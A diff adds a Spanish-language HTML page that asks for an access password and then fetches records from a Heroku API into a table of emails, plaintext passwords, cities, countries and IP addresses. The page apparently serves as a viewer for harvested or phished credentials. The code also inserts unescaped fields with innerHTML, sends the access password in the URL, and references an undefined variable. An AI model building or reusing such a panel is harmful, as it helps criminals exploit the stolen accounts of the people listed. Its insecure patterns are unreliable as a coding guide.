@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Tabla de correos</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="container mt-5">
+      <h1 class="mb-4">Tabla de correos</h1>
+      <form id="password-form">
+        <div class="mb-3">
+          <label for="password" class="form-label">Contraseña:</label>
+          <input type="password" class="form-control" id="password" required />
+        </div>
+        <button type="submit" class="btn btn-primary">Acceder</button>
+      </form>
+      <table class="table table-striped table-bordered" style="display: none;">
+        <thead class="table-dark">
+          <tr>
+            <th>Correo</th>
+            <th>Contraseña</th>
+            <th>Ciudad</th>
+            <th>País</th>
+            <th>IP</th>
+          </tr>
+        </thead>
+        <tbody id="tabla-body">
+          <!-- Aquí se mostrarán los datos de la tabla -->
+        </tbody>
+      </table>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="tabla.js"></script>
+
+    <script>
+      document.getElementById("password-form").addEventListener("submit", function(event) {
+        event.preventDefault();
+        const password = document.getElementById("password").value;
+        // Hacer una solicitud GET a tu API con la contraseña
+        axios
+          .get(`https://bhm-524a92f1cb36.herokuapp.com/tabla/${tableName}?password=${password}`)
+          .then(function (response) {
+            // Imprimir los datos recibidos en la consola
+            console.log(response.data);
+            const data = JSON.parse(response.data);
+
+            // Manejar la respuesta y mostrar los datos en la tabla
+            const tablaBody = document.getElementById("tabla-body");
+
+            // Iterar sobre los datos recibidos y crear las filas de la tabla
+            data.forEach(function (fila) {
+              const tr = document.createElement("tr");
+              tr.innerHTML = `
+                            <td>${fila.correo}</td>
+                            <td>${fila.contra}</td>
+                            <td>${fila.ciudad}</td>
+                            <td>${fila.pais}</td>
+                            <td>${fila.ip}</td>
+                        `;
+              tablaBody.appendChild(tr);
+            });
+
+            // Mostrar la tabla y ocultar el formulario
+            document.querySelector("table").style.display = "table";
+            document.getElementById("password-form").style.display = "none";
+          })
+          .catch(function (error) {
+            console.log(error);
+            alert("Contraseña incorrecta");
+          });
+      });
+    </script>
+  </body>
+</html>
